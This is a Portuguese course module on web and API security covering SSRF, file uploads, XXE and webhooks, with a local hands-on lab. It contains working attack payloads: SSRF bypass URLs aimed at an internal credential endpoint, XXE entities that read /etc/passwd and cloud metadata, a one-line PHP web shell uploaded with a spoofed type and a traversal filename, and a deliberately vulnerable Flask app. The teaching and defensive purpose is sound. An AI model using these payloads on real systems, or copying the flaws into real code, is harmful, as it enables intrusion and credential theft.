# Módulo 7 — SSRF, Uploads e Integrações Externas

**Curso:** Segurança de Aplicações Web e APIs
**Módulo:** 7 de 12 · 3 horas
**Pré-requisitos:** Módulos 1 a 6
**Próximo:** Módulo 8 — Fundamentos de segurança de APIs

---

## O que este módulo entrega

Ao final, você vai entender as falhas que fazem **o servidor agir em seu nome** — buscar uma URL, processar um arquivo, consumir um serviço. A pergunta central muda de "o que eu consigo enviar?" para **"para onde o servidor pode ir, e o que ele faz com o que traz de volta?"**. São as fronteiras 4 e 5 do módulo 1.

---

## 7.1 SSRF: o servidor como proxy

⚠ **O mecanismo, e por que ele é diferente de tudo que veio antes:**

```
   SEM SSRF                              COM SSRF
   ──────────                            ─────────

   ATACANTE ──► aplicacao                ATACANTE ──► aplicacao ──► ⚠ REDE INTERNA
       │                                      │            ┌──────────────┐
       │  ⚠ a rede interna nao                │            │ 10.0.0.5     │
       │    e' alcancavel de fora             │  ⚠ o servidor│ metro.       │
       │                                      │    ESTA      │ 127.0.0.1    │
       └── bloqueado pelo firewall            └──► dentro ──►│ 169.254.169  │
                                                             └──────────────┘
```

⚠ **A frase que organiza a seção:**

> **SSRF é uma confusão de posição: o atacante convence o servidor a usar as **credenciais de
> rede e de configuração** dele, em um pedido do atacante.**

⚠ **E é por isso que SSRF é tão grave:** o servidor tem privilégio de rede que o atacante não tem — está atrás do firewall, alcança o `localhost`, tem credencial de serviço em variável de ambiente, e pode ser **confiável** para os sistemas internos. ⚠ Trocar de posição vale mais que qualquer injeção.

---

## 7.2 Os destinos que importam

⚠ **A tabela que o teste precisa ter sempre à mão:**

| Destino | ⚠ O que se alcança |
|---|---|
| **`127.0.0.1` / `localhost`** | Serviços que escutam só na local — painel, métrica, `debug` |
| **`169.254.169.254`** | ⚠ ⚠ **Metadata da nuvem** — credencial de instância |
| `10.0.0.0/8`, `172.16/12`, `192.168/16` | Rede interna |
| `[::1]`, `0.0.0.0`, `0277.0.0.1` | ⚠ Outras formas de dizer local |
| **`file://`** | ⚠ Leitura de arquivo local |
| `gopher://`, `dict://` | ⚠ Fala com protocolo interno cru |
| `http://interno.nome` | Serviço por nome, atrás do firewall |

⚠ **O segundo é o achado de maior valor, e o mais específico:** os provedores de nuvem expõem **credencial temporária da instância** em um endereço link-local. ⚠ Quem alcança esse endereço **assume a identidade da máquina** — e o alcance é do **servidor**, não do atacante. Em ambientes de nuvem, é escalação de privilégio direta.

⚠ **E o `file://` explica por que a defesa por "bloquear IP privado" não basta:** o esquema também é dado do usuário.

---

## 7.3 Por que a defesa ingênua falha

⚠ **É a mesma lição do 5.4, com nomes diferentes. As quatro tentativas e o que cada uma deixa passar:**

| Tentativa | ⚠ Bypass |
|---|---|
| Bloquear a string `127.0.0.1` | ⚠ `127.1`, `2130706433` (decimal), `0x7f000001`, `[::1]` |
| Bloquear `localhost` | ⚠ `127.0.0.1.nip.io`, DNS `A` que aponta para local |
| Bloquear IP privado **na URL** | ⚠ **Redirect**: o destino devolve `302` para o interno |
| ⚠ **Validar, depois buscar** | ⚠ **TOCTOU**: o DNS responde público na validação e privado na busca |

⚠ **A quarta é a mais elegante e a mais difícil de corrigir.** O nome resolve para um IP público quando você valida, e para um IP interno quando o `.get()` acontece — é **DNS rebinding**, e é a razão de a validação precisar acontecer **no momento da conexão**, contra o IP já resolvido.

⚠ **A terceira é a que escapa de quase toda implementação:** validar a URL **inicial** não diz nada sobre **para onde ela redireciona**.

```python
# ⚠ VULNERAVEL — valida a URL, mas segue o redirect
def buscar(url):
    if urlparse(url).hostname in ("127.0.0.1", "localhost"):
        raise ValueError("bloqueado")
    return requests.get(url, allow_redirects=True).text    # ⚠ o destino redireciona
```

---

## 7.4 A correção estrutural

⚠ **Ela tem quatro partes, e as quatro são necessárias:**

```python
import ipaddress, socket, urllib.parse, requests

ESQUEMAS_OK = {"http", "https"}

def ip_e_proibido(ip):
    a = ipaddress.ip_address(ip)
    return (a.is_private or a.is_loopback or a.is_link_local
            or a.is_reserved or a.is_multicast or a.is_unspecified)

def resolver_seguro(host):
    # ⚠ resolve TODOS os enderecos, e recusa se QUALQUER um for proibido
    infos = socket.getaddrinfo(host, None)
    for fam, _, _, _, sa in infos:
        if ip_e_proibido(sa[0]):
            raise ValueError(f"destino proibido: {sa[0]}")
    return infos[0][4][0]

def buscar_seguro(url):
    p = urllib.parse.urlparse(url)

    # ⚠ 1. ESQUEMA em allowlist
    if p.scheme.lower() not in ESQUEMAS_OK:
        raise ValueError("esquema nao permitido")

    # ⚠ 2. RESOLVE e valida o IP REAL (nao a string do nome)
    ip = resolver_seguro(p.hostname)

    # ⚠ 3. NAO segue redirect automatico
    r = requests.get(url, allow_redirects=False, timeout=3)

    # ⚠ 4. se houver redirect, revalida o destino
    if r.is_redirect:
        destino = r.headers.get("Location")
        return buscar_seguro(urllib.parse.urljoin(url, destino))   # recursivo

    return r.text
```

⚠ **Quatro defesas que não são código, e valem mais que ele:**

| Defesa | ⚠ O que ela faz |
|---|---|
| **Segmentar a rede** | O servidor da aplicação **não alcança** o que não precisa |
| ⚠ **Bloquear em vez de filtrar** | Saída por allowlist de destino, no firewall |
| **Sem credencial no ambiente** | ⚠ Se a instância não tem permissão, o metadata vale pouco |
| **`IMDSv2` no provedor** | ⚠ Exige token — e cabeçalho — para o metadata |

⚠ **A segunda linha é o argumento central:** SSRF é uma falha de **permissão de saída**. ⚠ Se o servidor só pode falar com três destinos, o ataque tem três alvos, e nenhum deles é interno. É a mesma lógica de **menor privilégio** do 5.6 — aplicada à rede em vez de ao banco.

---

## 7.5 Upload: quatro coisas podem estar erradas

⚠ **Upload não é uma falha — são quatro, independentes:**

| # | Aspecto | ⚠ A falha |
|---|---|---|
| 1 | **Nome** | `../../x.php` — path traversal no destino |
| 2 | **Tipo declarado** | ⚠ `Content-Type` vem do **cliente** |
| 3 | **Extensão** | `.php`, `.jsp`, `.svg`, `.htaccess` |
| 4 | **Conteúdo** | ⚠ Arquivo válido que explora o **processador** |

⚠ **O item 2 é sempre um erro de confiança:** o `Content-Type` é um header do cliente. ⚠ Validar por ele é validar por declaração — e declaração é o que o atacante controla. A validação real é **magic bytes** (o começo do arquivo) **mais** uma allowlist de extensão.

⚠ **E o item 4 é o que sobrevive a tudo:** um `.png` **válido**, com a extensão correta e o conteúdo mágico correto, ainda pode explorar o **decodificador**. ⚠ Não para o navegador — para **o servidor** que processa a imagem (biblioteca de redimensionamento, conversor, OCR). É uma falha de **processamento**, não de upload.

⚠ **A tabela de armazenamento importa tanto quanto a validação:**

| Onde guardar | ⚠ Se o diretório for servido | ⚠ Se for fora do web root |
|---|---|---|
| Fora do web root | — | ✅ Correto |
| Dentro do web root | ⚠ **Execução direta** se a extensão for interpretável | ⚠ Ainda acessível |
| Objeto (S3, bucket) | ⚠ Se público e com `Content-Type` do cliente | ✅ com política |
| Nome original | ⚠ Traversal, colisão, sobrescrita | ⚠ Traversal |
| ⚠ **Nome gerado** | ✅ | ✅ |

⚠ **A última linha é a correção mais simples e mais eficaz:** **nunca use o nome enviado.** Gere o seu (`uuid`), guarde a extensão **derivada** (não a enviada), e sirva por rota controlada. ⚠ Isso remove o traversal, a colisão, a sobrescrita e a execução direta de uma vez.

---

## 7.6 XXE e formatos que acionam processamento

⚠ **`XXE` é injeção no parser de XML — a mesma causa do módulo 5, com um recurso a mais: o XML **sabe** buscar arquivo e fazer requisição.**

```xml
<!-- ⚠ VULNERAVEL — entidade externa -->
<?xml version="1.0"?>
<!DOCTYPE nota [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">          <!-- ⚠ leitura local -->
]>
<nota><titulo>&xxe;</titulo></nota>

<!-- ⚠ e a versao SSRF: -->
<!DOCTYPE nota [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

⚠ **O que faz XXE ser **tão** grave: ele combina os dois módulos.** O parser lê arquivo **local** (como o 5.4) **e** faz requisição **interna** (como o 7.1). ⚠ Um só pedido, dois impactos.

⚠ **E o formato que o recebe não é só XML:**

| Formato | ⚠ Processamento externo |
|---|---|
| **XML** | Entidade externa, DTD, `XInclude` |
| **`.docx`/`.xlsx`** | ⚠ **É ZIP com XML dentro** — o parser roda |
| **`.svg`** | ⚠ XML — e pode ter script |
| **`.pdf`** | JavaScript embutido, URL remota |
| **YAML** | ⚠ Tag de objeto — desserialização |
| **`.zip`/`.tar`** | ⚠ Traversal na extração (Zip Slip) |

⚠ **A primeira da direita é a que surpreende:** um `.docx` **é** um arquivo zip com XML. ⚠ "Só aceito `.docx`, não `.xml`" **não é** miti­gação — o parser de XML vai rodar de qualquer forma, dentro do arquivo.

⚠ **A correção é desligar o recurso, e ela varia por biblioteca:**

```python
# ✅ Python — defusedxml, ou parser sem entidade
from defusedxml import ElementTree as DET
arvore = DET.fromstring(dados)          # ⚠ entidade externa desabilitada

# ✅ lxml — resolve_entities=False, no_network=True
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True,
                         dtd_validation=False, load_dtd=False)
arvore = etree.fromstring(dados, parser)

# ⚠ NUNCA: o parser padrao com entidade ligada
# import xml.etree.ElementTree as ET
# ET.fromstring(dados)   # ⚠ depende da versao e da config do sistema
```

⚠ **Zip Slip merece linha própria, porque é o mesmo bug do 5.4 em outro formato:** extrair sem validar o nome do membro permite escrever fora do diretório de destino. As bibliotecas modernas tratam; as antigas, não. ⚠ E o teste é o mesmo: **resolva o caminho e confira se ficou dentro da base.**

---

## 7.7 Consumo de serviço externo

⚠ **A fronteira 5 do módulo 1: a **resposta** de terceiro tratada como própria.**

| Falha | ⚠ Mecanismo |
|---|---|
| **Desserialização da resposta** | ⚠ O formato do terceiro vira objeto |
| **Repasse direto ao cliente** | ⚠ A resposta externa é ecoada — XSS de terceiro |
| **URL do webhook controlada** | ⚠ SSRF, pelo caminho de "notificação" |
| **Confiança na assinatura não verificada** | ⚠ Qualquer um chama o webhook |
| ⚠ **Verificar a assinatura depois de processar** | ⚠ TOCTOU processual |

⚠ **O terceiro é especialmente interessante:** muitas aplicações permitem cadastrar uma URL para receber notificação. ⚠ Isso é **SSRF por desenho** — e é legítimo, o que torna a correção mais difícil: não se pode simplesmente bloquear, é preciso **validar o destino cadastrado e revalidar na hora do disparo**.

⚠ **E o webhook que não verifica assinatura** é uma porta de escrita: qualquer um que saiba a URL **injeta evento** na aplicação. ⚠ A correção é **HMAC com segredo compartilhado**, e a verificação precisa usar **comparação em tempo constante** — porque aqui o atacante pode tentar quantas vezes quiser, e uma comparação que sai cedo vaza a assinatura byte a byte.

```python
# ✅ CORRIGIDO — assinatura verificada com comparacao em tempo constante
import hmac, hashlib

def webhook_valido(corpo_bruto, assinatura_recebida, segredo):
    esperado = hmac.new(segredo, corpo_bruto, hashlib.sha256).hexdigest()
    # ⚠ compare_digest: nao sai cedo, nao vaza por timing
    return hmac.compare_digest(esperado, assinatura_recebida)
```

⚠ **O `compare_digest` conecta este módulo ao curso de Criptografia Aplicada**, onde a comparação em tempo não constante é uma classe de falha. ⚠ A regra é a mesma: **comparação de segredo nunca sai cedo.**

---

## Laboratório 7 — O que o servidor alcança

⚠ **Não testado em ambiente isolado. Valide antes de publicar.**

⚠ **Este lab precisa de um "interno" fictício para ter alvo.** Crie os serviços que o SSRF deve alcançar — na **sua** máquina.

```bash
mkdir -p ~/web-lab/m07 && cd ~/web-lab/m07
python3 -m venv .venv && source .venv/bin/activate
pip install flask requests
```

```bash
# ── 1. Os "servicos internos" FICTICIOS do lab ──────────────
cat > interno_secreto.py <<'EOF'
from flask import Flask, jsonify
app = Flask(__name__)
@app.get("/credencial")
def cred(): return jsonify({"segredo": "token-interno-do-lab", "papel": "admin"})
@app.get("/")
def raiz(): return "painel interno do lab — nao deveria ser alcancavel"
if __name__ == "__main__": app.run(host="127.0.0.1", port=9000)
EOF
python interno_secreto.py &
```

```python
# app.py — aplicacao com SSRF, upload e webhook
from flask import Flask, request, jsonify
import requests, os, subprocess
from urllib.parse import urlparse

app = Flask(__name__)
UPLOADS = "uploads"; os.makedirs(UPLOADS, exist_ok=True)

# ── FALHA 1: SSRF — valida a string, e segue redirect ─────────
@app.post("/api/importar")
def importar():
    url = request.form.get("url", "")
    p = urlparse(url)
    if p.hostname in ("127.0.0.1", "localhost"):          # ⚠ denylist de string
        return jsonify({"erro": "bloqueado"}), 400
    try:
        r = requests.get(url, timeout=3, allow_redirects=True)   # ⚠ segue redirect
        return jsonify({"status": r.status_code, "corpo": r.text[:500]})
    except Exception as e:
        return jsonify({"erro": str(e)}), 500

# ── FALHA 2: upload — confia no tipo e no nome ───────────────
@app.post("/api/upload")
def upload():
    f = request.files.get("arquivo")
    ctype = f.content_type                                # ⚠ declarado pelo cliente
    if not ctype.startswith("image/"):
        return jsonify({"erro": "so imagem"}), 400
    destino = os.path.join(UPLOADS, f.filename)           # ⚠ nome do cliente
    f.save(destino)
    return jsonify({"ok": True, "salvo_em": destino})

# ── FALHA 3: webhook — sem assinatura, URL controlada ────────
@app.post("/api/webhook")
def webhook():
    dados = request.get_json() or {}                      # ⚠ importa sem verificar
    url_cb = dados.get("callback")
    if url_cb:
        requests.post(url_cb, json={"recebido": True}, timeout=3)  # ⚠ SSRF de desenho
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
```

```bash
python app.py

# ── 1. SSRF: os destinos ────────────────────────────────────
#    baseline: destino externo normal
curl -s -X POST -d "url=https://example.com" http://127.0.0.1:5000/api/importar | head -3

#    ⚠ o "interno" que nao deveria ser alcancavel
curl -s -X POST -d "url=http://127.0.0.1:9000/credencial" http://127.0.0.1:5000/api/importar

#    ⚠ BYPASS 1: outra forma de dizer 127.0.0.1
curl -s -X POST -d "url=http://127.1:9000/credencial" http://127.0.0.1:5000/api/importar
curl -s -X POST -d "url=http://2130706433:9000/credencial" http://127.0.0.1:5000/api/importar
curl -s -X POST -d "url=http://[::1]:9000/credencial" http://127.0.0.1:5000/api/importar

#    ⚠ BYPASS 2: esquema diferente
curl -s -X POST -d "url=file:///etc/hostname" http://127.0.0.1:5000/api/importar

#    ⚠ BYPASS 3: o REDIRECT (o mais importante)
cat > redir.py <<'EOF'
from flask import Flask, redirect
app = Flask(__name__)
@app.get("/ir")
def ir(): return redirect("http://127.0.0.1:9000/credencial")   # ⚠ destino interno
if __name__ == "__main__": app.run(host="127.0.0.1", port=9100)
EOF
python redir.py &
curl -s -X POST -d "url=http://127.0.0.1:9100/ir" http://127.0.0.1:5000/api/importar

# ── 2. Upload ───────────────────────────────────────────────
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -s -X POST -F "arquivo=@shell.php;type=image/png" \
     http://127.0.0.1:5000/api/upload
curl -s -X POST -F "arquivo=@shell.php;filename=../../fora.txt;type=image/png" \
     http://127.0.0.1:5000/api/upload
ls -la uploads/ ../ 2>/dev/null | head

# ── 3. Webhook ──────────────────────────────────────────────
curl -s -X POST -H "Content-Type: application/json" \
     -d '{"callback":"http://127.0.0.1:9000/credencial"}' \
     http://127.0.0.1:5000/api/webhook
```

**O que observar:** no bypass 3, a URL inicial **passou** pela validação — o nome não é `127.0.0.1` — e o destino final **é** o interno. ⚠ É a demonstração de que validar a URL inicial não diz nada sobre o destino. E no upload, o `.php` com `Content-Type: image/png` **passou**: o tipo era uma declaração do cliente.

**Exercício 1:** para os **quatro** destinos do 7.2, escreva um teste e registre o resultado. ⚠ Depois escreva, para cada um, qual **defesa de rede** (não de código) o teria impedido.

**Exercício 2:** implemente a `buscar_seguro` do 7.4 e prove que os **três** bypasses do passo 1 falham. ⚠ O caso do redirect exige `allow_redirects=False` + revalidação — explique por que só o primeiro não basta.

**Exercício 3 (o que vale):** corrija o **upload** com **nome gerado + extensão em allowlist + validação de magic bytes**, e prove que o `shell.php` (mesmo com `Content-Type` mentido) **não passa**. ⚠ Depois corrija o **webhook** com HMAC e `compare_digest`, e escreva o teste de regressão dos dois.

---

## Resumo

- ⚠ **SSRF é confusão de posição**: o atacante usa o privilégio **de rede** do servidor.
- ⚠ **`169.254.169.254` é o achado de maior valor** — o metadata da nuvem entrega credencial de instância.
- ⚠ **A defesa ingênua falha quatro vezes**: notação alternada, nome que resolve para local, **redirect** e **DNS rebinding** (TOCTOU).
- ⚠ **Valide o IP já resolvido, no momento da conexão**, e **não siga redirect** sem revalidar.
- ⚠ **A defesa que mais resolve é de rede**: allowlist de saída e segmentação — não de código.
- **Upload são quatro falhas**: nome, tipo declarado, extensão e **conteúdo** (o processador).
- ⚠ **Nunca use o nome enviado** — gerar o nome remove traversal, colisão, sobrescrita e execução.
- ⚠ **`.docx` é ZIP com XML** — XXE roda de qualquer forma; a correção é **desligar entidade externa**.
- ⚠ **Webhook sem assinatura é porta de escrita**; a verificação exige **HMAC + `compare_digest`**.

---

## O que o próximo módulo entrega

Você cobriu as falhas de servidor e de cliente. O módulo 8 trata **API como contrato**: REST, versionamento, inventário de endpoint, e a matriz **identidade × permissão × dado** que transforma achado solto em cobertura sistemática.
